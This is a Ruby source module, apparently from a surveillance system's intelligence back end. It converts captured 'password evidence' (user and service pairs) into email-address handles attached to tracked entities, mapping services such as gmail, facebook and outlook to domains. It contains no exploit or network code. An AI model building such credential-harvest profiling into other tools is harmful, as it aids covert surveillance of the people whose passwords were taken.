require 'mail'
require 'rcs-common/trace'

module RCS
module Intelligence

module Passwords
  extend Tracer
  extend self

  def known_domains
    {
      /gmail|google/i => '@gmail.com',
      /facebook/i     => '@facebook.com',
      /outlook/i      => '@outlook.com'
    }
  end

  def valid_password_evidence?(evidence)
    data = evidence[:data]
    return false unless evidence.type == 'password'
    return false if data['user'].blank? or data['service'].blank?
    true
  end

  # Creates an EntityHandle using the information of password_evidence and
  # adds it to the given entity. password_evidence may contain:
  #   * generic email accounts, for example:
  #     an evidence with user=john@libero.it and service=libero produces an
  #     handle with type=:mail, handle=john@libero.it
  #   * account for known services, for example:
  #     an evidence with user=john and service=facebook produces an
  #     handle with type=:mail, handle=john@facebook.com
  def add_handle(entity, password_evidence)
    data = password_evidence[:data]

    trace :debug, "Parsing handle data: #{data.inspect}"

    return unless valid_password_evidence?(password_evidence)

    handle = email_address data['user'], data['service']

    return unless handle

    entity.create_or_update_handle :mail, handle.downcase, data['user']
  rescue Exception => e
    trace :error, "Cannot add handle: #{e.message}"
    trace :fatal, e.backtrace.join("\n")
  end

  # Extracts a valid email address from the given user and services.
  # @example email_address('john', 'google') # => john@gmail.com
  #          email_address('john', 'msn') # => nil
  def email_address user, service
    return user if valid_email_addr? user
    match = known_domains.find { |regexp, domain| service =~ regexp }
    "#{user}#{match[1]}" if match
  end

  def valid_email_addr?(value)
    return false if value == ''
    parsed = Mail::Address.new(value)
    return parsed.address == value && parsed.local != parsed.address
  rescue Mail::Field::ParseError
    return false
  end
end

end
end
